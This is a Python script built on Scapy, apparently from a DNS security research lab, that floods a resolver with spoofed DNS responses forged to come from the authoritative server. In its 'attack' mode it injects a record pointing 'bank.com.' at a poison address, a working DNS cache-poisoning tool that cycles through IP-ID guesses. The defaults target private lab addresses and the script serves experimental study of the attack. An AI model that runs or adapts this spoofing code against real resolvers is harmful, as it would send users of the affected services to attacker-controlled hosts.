#!/usr/bin/env python3
"""Rate-controlled FRAG2 sender for E5 occupancy cells.

Spoofs AUTH_IP so samples land in the same R2EntropyTable key that
query_upstream scores: (UPSTREAM_IP, RESOLVER_BIND_IP).

Canonical experiment copy: research/Report/experiments/E5/e5_frag_sender.py.
This lab file is installed into the attacker image at /app/e5_frag_sender.py.
"""
from __future__ import annotations

import argparse
import os
import random
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore

RESOLVER_IP = os.getenv("RESOLVER_IP", "10.70.0.53")
AUTH_IP = os.getenv("AUTH_IP", "10.70.0.100")
RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
FRAG2_OFFSET = int(os.getenv("FRAG2_OFFSET", "1480"))
POISON_IP = os.getenv("POISON_IP", "6.6.6.6")
POISON_DOMAIN = os.getenv("POISON_DOMAIN", "bank.com.")
FRAG2_QNAME = os.getenv("FRAG2_QNAME", "_frag2.example.net.")
FRAGMETA_QNAME = os.getenv("FRAGMETA_QNAME", "_fragmeta.example.net.")


def build_packet(ipid: int, mode: str) -> object:
    extra = {}
    if mode == "attack":
        extra["an"] = DNSRR(rrname=POISON_DOMAIN, type="A", ttl=300, rdata=POISON_IP)
        extra["ancount"] = 1
    return (
        IP(src=AUTH_IP, dst=RESOLVER_IP)
        / UDP(sport=53, dport=RESOLVER_UPSTREAM_PORT)
        / DNS(
            id=ipid % 65535,
            qr=1,
            aa=1,
            rd=1,
            qd=DNSQR(qname=FRAG2_QNAME, qtype="TXT"),
            ar=DNSRR(
                rrname=FRAGMETA_QNAME,
                type="TXT",
                ttl=1,
                rdata=f"TYPE=FRAG2;IPID={ipid};OFFSET={FRAG2_OFFSET}",
            ),
            arcount=1,
            **extra,
        )
    )


def ipid_iter(ipid_mode: str, ipid_space: int, fixed_ipid: int, rng: random.Random):
    while True:
        if ipid_mode == "fixed":
            yield fixed_ipid
        else:
            yield rng.randrange(max(1, ipid_space))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=("benign", "attack"), required=True)
    parser.add_argument("--rate-pps", type=float, required=True)
    parser.add_argument("--ipid-mode", choices=("random", "fixed"), default="random")
    parser.add_argument("--ipid-space", type=int, default=int(os.getenv("IPID_SPACE", "2048")))
    parser.add_argument("--fixed-ipid", type=int, default=int(os.getenv("FIXED_IPID", "777")))
    parser.add_argument("--seed", type=int, default=None)
    args = parser.parse_args()
    if args.rate_pps <= 0:
        raise SystemExit("rate-pps must be > 0")

    interval = 1.0 / args.rate_pps
    rng = random.Random(args.seed)
    gen = ipid_iter(args.ipid_mode, args.ipid_space, args.fixed_ipid, rng)
    print(
        f"[e5_sender] mode={args.mode} rate_pps={args.rate_pps} "
        f"ipid_mode={args.ipid_mode} ipid_space={args.ipid_space} "
        f"fixed_ipid={args.fixed_ipid} seed={args.seed}",
        flush=True,
    )
    while True:
        started = time.perf_counter()
        send(build_packet(next(gen), args.mode), verbose=0)
        delay = interval - (time.perf_counter() - started)
        if delay > 0:
            time.sleep(delay)


if __name__ == "__main__":
    main()
